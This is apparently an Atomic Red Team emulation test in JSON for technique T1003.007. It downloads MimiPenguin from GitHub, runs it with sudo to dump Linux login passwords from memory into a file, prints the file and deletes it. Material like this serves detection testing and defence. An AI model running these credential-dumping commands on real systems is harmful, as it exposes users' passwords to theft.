{
  "id": "a27418de-bdce-4ebd-b655-38f04842bf0c",
  "name": "Capture Passwords with MimiPenguin",
  "description": "MimiPenguin is a tool inspired by MimiKatz that targets Linux systems affected by CVE-2018-20781 (Ubuntu-based distros and certain versions of GNOME Keyring). \nUpon successful execution on an affected system, MimiPenguin will retrieve passwords from memory and output them to a specified file. \nSee https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20781. \nSee https://www.tecmint.com/mimipenguin-hack-login-passwords-of-linux-users/#:~:text=Mimipenguin%20is%20a%20free%20and,tested%20on%20various%20Linux%20distributions.\n",
  "platforms": [
    "linux"
  ],
  "steps": [
    {
      "id": "a1dea497-6a0f-4f25-b59a-4977e1ee42d4",
      "type": "execute-command",
      "data": {
        "command": "sudo #{MimiPenguin_Location} \u003e #{output_file}\ncat #{output_file}\n",
        "command_type": "bash"
      },
      "elevation_required": false
    },
    {
      "id": "14c96386-2a4a-4423-978c-b9cd6821cc2a",
      "type": "execute-command",
      "data": {
        "command": "rm -f #{output_file} \u003e /dev/null\n",
        "command_type": "bash"
      },
      "elevation_required": false
    },
    {
      "id": "e2aff814-98f5-46f6-8a92-072447470eaa",
      "name": "Check dependency 1/4",
      "description": "MimiPenguin script must exist on disk at specified location (#{MimiPenguin_Location})\n",
      "type": "execute-command",
      "data": {
        "command": "if [ -f \"#{MimiPenguin_Location}\" ]; then exit 0; else exit 1; fi;\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "5cfaf407-182d-42e0-b579-31e2ac5cb11f",
      "name": "Resolve dependency 1/4",
      "description": "MimiPenguin script must exist on disk at specified location (#{MimiPenguin_Location})\n",
      "type": "execute-command",
      "data": {
        "command": "wget -O \"/tmp/mimipenguin.tar.gz\" https://github.com/huntergregal/mimipenguin/releases/download/2.0-release/mimipenguin_2.0-release.tar.gz\nmkdir /tmp/mimipenguin\ntar -xzvf \"/tmp/mimipenguin.tar.gz\" -C /tmp/mimipenguin\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "a361139c-7679-4589-b05d-1fffcc2799dd",
      "name": "Re-check dependency 1/4",
      "description": "MimiPenguin script must exist on disk at specified location (#{MimiPenguin_Location})\n",
      "type": "execute-command",
      "data": {
        "command": "if [ -f \"#{MimiPenguin_Location}\" ]; then exit 0; else exit 1; fi;\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "0f80f914-bc3a-49eb-a07f-61c593e27c84",
      "name": "Check dependency 2/4",
      "description": "Strings must be installed\n",
      "type": "execute-command",
      "data": {
        "command": "if [ -x \"$(command -v strings --version)\" ]; then exit 0; else exit 1; fi;\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "004aab1f-cb80-4ded-ae72-527321a3b90b",
      "name": "Resolve dependency 2/4",
      "description": "Strings must be installed\n",
      "type": "execute-command",
      "data": {
        "command": "sudo apt-get -y install binutils\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "6959de1c-4ecb-45cc-95c0-fe59c6b3eaf7",
      "name": "Re-check dependency 2/4",
      "description": "Strings must be installed\n",
      "type": "execute-command",
      "data": {
        "command": "if [ -x \"$(command -v strings --version)\" ]; then exit 0; else exit 1; fi;\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "54cbf9b3-e449-4abe-8217-e4f707095090",
      "name": "Check dependency 3/4",
      "description": "Python2 must be installed\n",
      "type": "execute-command",
      "data": {
        "command": "if [ -x \"$(command -v python2 --version)\" ]; then exit 0; else exit 1; fi;\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "a51d4f62-59ed-4d2f-949d-12f0e2da3e5c",
      "name": "Resolve dependency 3/4",
      "description": "Python2 must be installed\n",
      "type": "execute-command",
      "data": {
        "command": "sudo apt-get -y install python2       \n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "34639661-0692-420f-bff5-09b13de0247c",
      "name": "Re-check dependency 3/4",
      "description": "Python2 must be installed\n",
      "type": "execute-command",
      "data": {
        "command": "if [ -x \"$(command -v python2 --version)\" ]; then exit 0; else exit 1; fi;\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "b8bccd04-bd76-4bd0-97b4-0f5ba0b1a53b",
      "name": "Check dependency 4/4",
      "description": "Libc-bin must be installed\n",
      "type": "execute-command",
      "data": {
        "command": "if [ -x \"$(command -v ldd --version)\" ]; then exit 0; else exit 1; fi;\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "ad6b059e-a9b2-47e0-abb3-8c7a3acdf57a",
      "name": "Resolve dependency 4/4",
      "description": "Libc-bin must be installed\n",
      "type": "execute-command",
      "data": {
        "command": "sudo apt-get -y install libc-bin        \n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "8215715f-3dca-4318-996a-2bb0e0eaddf8",
      "name": "Re-check dependency 4/4",
      "description": "Libc-bin must be installed\n",
      "type": "execute-command",
      "data": {
        "command": "if [ -x \"$(command -v ldd --version)\" ]; then exit 0; else exit 1; fi;\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "a1dea497-6a0f-4f25-b59a-4977e1ee42d4",
      "p": "on-success",
      "o": "14c96386-2a4a-4423-978c-b9cd6821cc2a"
    },
    {
      "s": "a1dea497-6a0f-4f25-b59a-4977e1ee42d4",
      "p": "on-failure",
      "o": "14c96386-2a4a-4423-978c-b9cd6821cc2a"
    },
    {
      "s": "e2aff814-98f5-46f6-8a92-072447470eaa",
      "p": "on-success",
      "o": "a1dea497-6a0f-4f25-b59a-4977e1ee42d4"
    },
    {
      "s": "e2aff814-98f5-46f6-8a92-072447470eaa",
      "p": "on-failure",
      "o": "5cfaf407-182d-42e0-b579-31e2ac5cb11f"
    },
    {
      "s": "5cfaf407-182d-42e0-b579-31e2ac5cb11f",
      "p": "on-success",
      "o": "a361139c-7679-4589-b05d-1fffcc2799dd"
    },
    {
      "s": "a361139c-7679-4589-b05d-1fffcc2799dd",
      "p": "on-failure",
      "o": "a1dea497-6a0f-4f25-b59a-4977e1ee42d4"
    },
    {
      "s": "0f80f914-bc3a-49eb-a07f-61c593e27c84",
      "p": "on-success",
      "o": "a1dea497-6a0f-4f25-b59a-4977e1ee42d4"
    },
    {
      "s": "0f80f914-bc3a-49eb-a07f-61c593e27c84",
      "p": "on-failure",
      "o": "004aab1f-cb80-4ded-ae72-527321a3b90b"
    },
    {
      "s": "004aab1f-cb80-4ded-ae72-527321a3b90b",
      "p": "on-success",
      "o": "6959de1c-4ecb-45cc-95c0-fe59c6b3eaf7"
    },
    {
      "s": "6959de1c-4ecb-45cc-95c0-fe59c6b3eaf7",
      "p": "on-failure",
      "o": "a1dea497-6a0f-4f25-b59a-4977e1ee42d4"
    },
    {
      "s": "54cbf9b3-e449-4abe-8217-e4f707095090",
      "p": "on-success",
      "o": "a1dea497-6a0f-4f25-b59a-4977e1ee42d4"
    },
    {
      "s": "54cbf9b3-e449-4abe-8217-e4f707095090",
      "p": "on-failure",
      "o": "a51d4f62-59ed-4d2f-949d-12f0e2da3e5c"
    },
    {
      "s": "a51d4f62-59ed-4d2f-949d-12f0e2da3e5c",
      "p": "on-success",
      "o": "34639661-0692-420f-bff5-09b13de0247c"
    },
    {
      "s": "34639661-0692-420f-bff5-09b13de0247c",
      "p": "on-failure",
      "o": "a1dea497-6a0f-4f25-b59a-4977e1ee42d4"
    },
    {
      "s": "b8bccd04-bd76-4bd0-97b4-0f5ba0b1a53b",
      "p": "on-success",
      "o": "a1dea497-6a0f-4f25-b59a-4977e1ee42d4"
    },
    {
      "s": "b8bccd04-bd76-4bd0-97b4-0f5ba0b1a53b",
      "p": "on-failure",
      "o": "ad6b059e-a9b2-47e0-abb3-8c7a3acdf57a"
    },
    {
      "s": "ad6b059e-a9b2-47e0-abb3-8c7a3acdf57a",
      "p": "on-success",
      "o": "8215715f-3dca-4318-996a-2bb0e0eaddf8"
    },
    {
      "s": "8215715f-3dca-4318-996a-2bb0e0eaddf8",
      "p": "on-failure",
      "o": "a1dea497-6a0f-4f25-b59a-4977e1ee42d4"
    }
  ],
  "tags": [
    "T1003.007",
    "atomic-red-team"
  ],
  "input_arguments": [
    {
      "name": "output_file",
      "type": "path",
      "description": "Path where captured results will be placed",
      "value": "/tmp/T1003.007Test3.txt"
    },
    {
      "name": "MimiPenguin_Location",
      "type": "path",
      "description": "Path of MimiPenguin script",
      "value": "/tmp/mimipenguin/mimipenguin_2.0-release/mimipenguin.sh"
    }
  ]
}